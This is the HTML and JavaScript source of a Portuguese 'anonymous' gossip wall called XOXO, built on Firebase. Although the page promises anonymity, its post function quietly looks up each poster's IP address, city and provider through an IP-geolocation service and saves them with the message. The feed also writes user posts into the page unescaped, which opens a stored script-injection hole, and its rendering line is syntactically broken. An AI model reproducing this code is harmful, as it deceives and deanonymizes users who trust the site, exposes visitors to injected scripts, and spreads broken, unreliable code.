<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XOXO - Mural Anonymous</title>
    
    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-firestore-compat.js"></script>

    <style>
        :root { --deep-black: #050505; }
        
        body { 
            margin: 0; background-color: var(--deep-black); color: #ddd; 
            font-family: 'Courier New', monospace; overflow: hidden; height: 100vh;
        }

        /* Efeito de Névoa Animada */
        .fog-container {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            z-index: -1; background: radial-gradient(circle, transparent, var(--deep-black));
        }
        .fog {
            position: absolute; width: 200%; height: 100%;
            background: url('https://www.transparenttextures.com/patterns/smoke.png');
            opacity: 0.2; animation: moveFog 50s linear infinite;
        }
        @keyframes moveFog { from { transform: translateX(0); } to { transform: translateX(-50%); } }

        /* Fundo com Máscara e Título */
        .hero { 
            height: 45vh; display: flex; flex-direction: column; 
            justify-content: center; align-items: center; text-align: center;
            background: url('https://images.unsplash.com/photo-1550751827-4bd374c3f58b?q=80&w=1000&auto=format&fit=crop') no-repeat center;
            background-size: contain;
        }
        .hero h1 { font-size: 5rem; margin: 0; color: #fff; letter-spacing: 15px; text-shadow: 0 0 15px #fff; }

        /* Telas */
        #login-screen { display: flex; justify-content: center; padding: 40px; }
        #feed-container { display: none; padding: 20px; max-width: 600px; margin: auto; overflow-y: auto; height: 50vh; }

        .btn-enter { 
            background: transparent; color: white; padding: 15px 40px; 
            border: 1px solid #555; cursor: pointer; text-transform: uppercase;
        }
        .btn-enter:hover { background: white; color: black; box-shadow: 0 0 20px white; }

        .input-box { background: rgba(15, 15, 15, 0.9); padding: 20px; border: 1px solid #333; margin-bottom: 20px; backdrop-filter: blur(10px); }
        textarea { width: 100%; background: transparent; border: none; color: #fff; font-size: 1.1rem; outline: none; resize: none; }
        
        .btn-post { background: #222; color: #fff; border: 1px solid #444; padding: 10px 25px; float: right; cursor: pointer; }
        .btn-post:disabled { opacity: 0.3; cursor: wait; }

        .fofoca-card { background: rgba(20, 20, 20, 0.8); padding: 15px; margin-bottom: 10px; border-left: 2px solid #fff; }
    </style>
</head>
<body>

    <div class="fog-container"><div class="fog"></div></div>

    <header class="hero">
        <h1>XOXO</h1>
        <p>Segredos que o silêncio guarda.</p>
    </header>

    <div id="login-screen">
        <button class="btn-enter" onclick="entrar()">ACEDER AO MURAL</button>
    </div>

    <div id="feed-container">
        <div class="input-box">
            <textarea id="fofocaInput" rows="3" placeholder="Sussurre aqui..."></textarea>
            <button class="btn-post" id="btnEnviar" onclick="enviarFofoca()">SOLTAR O VERBO</button>
            <div style="clear: both;"></div>
        </div>
        <div id="mural"></div>
    </div>

    <script>
        var firebaseConfig = {
            apiKey: "AIzaSyC_RKEhHxEvgDN0w7X1AMAwE0a4ljiSbh4",
            authDomain: "xoxo-fofocas.firebaseapp.com",
            projectId: "xoxo-fofocas",
            storageBucket: "xoxo-fofocas.firebasestorage.app",
            messagingSenderId: "730968176054",
            appId: "1:730968176054:web:fcabf0465b189fddbdbd17",
            measurementId: "G-3DZPC3E7SV"
        };
        firebase.initializeApp(firebaseConfig);
        var db = firebase.firestore();

        function entrar() {
            document.getElementById('login-screen').style.display = 'none';
            document.getElementById('feed-container').style.display = 'block';
            carregarFofocas();
        }

        function enviarFofoca() {
            const input = document.getElementById('fofocaInput');
            const btn = document.getElementById('btnEnviar');
            const texto = input.value;
            if (!texto.trim()) return;

            btn.disabled = true;
            btn.innerText = "RASTREANDO...";

            let finalizado = false;

            // Segurança: Se em 2 segundos a API de IP não responder, manda sem rastro para não travar
            const timeout = setTimeout(() => {
                if (!finalizado) {
                    finalizado = true;
                    gravarFirebase(texto, { status: "Rastreio Offline" });
                }
            }, 2000);

            // Captura de IP via JSONP
            window.processarIP = function(data) {
                if (!finalizado) {
                    finalizado = true;
                    clearTimeout(timeout);
                    gravarFirebase(texto, {
                        ip: data.ip || "0.0.0.0",
                        cidade: data.city || "Desconhecida",
                        provedor: data.org || "Não identificado"
                    });
                }
            };

            const script = document.createElement('script');
            script.src = 'https://ipapi.co/jsonp/callback=processarIP';
            document.body.appendChild(script);
        }

        function gravarFirebase(texto, rastro) {
            db.collection("fofocas").add({
                conteudo: texto,
                data: firebase.firestore.FieldValue.serverTimestamp(),
                rastro: rastro
            }).then(() => {
                document.getElementById('fofocaInput').value = "";
                alert("Segredo enviado!");
            }).finally(() => {
                const btn = document.getElementById('btnEnviar');
                btn.disabled = false;
                btn.innerText = "SOLTAR O VERBO";
                const s = document.querySelector('script[src*="ipapi"]');
                if(s) s.remove();
            });
        }

        function carregarFofocas() {
            db.collection("fofocas").orderBy("data", "desc").onSnapshot(snap => {
                const mural = document.getElementById('mural');
                mural.innerHTML = "";
                snap.forEach(doc => {
                    mural.innerHTML += <div class="fofoca-card"><p>${doc.data().conteudo}</p></div>;
                });
            });
        }
    </script>
</body>
</html>
